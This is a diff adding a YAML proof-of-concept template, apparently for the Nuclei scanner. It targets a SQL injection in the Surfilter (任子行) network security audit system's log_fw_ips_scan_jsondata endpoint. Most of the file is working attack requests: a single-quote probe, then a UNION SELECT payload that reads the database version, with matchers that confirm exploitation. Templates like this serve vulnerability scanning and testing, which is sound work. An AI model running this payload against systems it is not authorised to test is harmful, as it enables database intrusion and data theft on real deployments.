@@ -1,0 +1,33 @@
+id: poc-yaml-surfilter-nsas-log-fw-ips-scan-jsondata-sqli
+info:
+  name: 任子行网络安全审计系统 log_fw_ips_scan_jsondata SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    任子行网络安全审计系统存在SQL注入漏洞，攻击者可以利用此漏洞执行任意SQL命令。
+http:
+  - raw:
+      - |
+        GET /webui/?g=log_fw_ips_scan_jsondata&uname=' HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{BaseURL}}
+    matchers:
+      - type: status
+        status:
+          - 500
+  - raw:
+      - |
+        GET /webui/?g=log_fw_ips_scan_jsondata&uname='+union+select+sqlite_version(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+ HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{BaseURL}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"group\":"
+          - "\"id\":"
+          - "\"ips_uname\":"
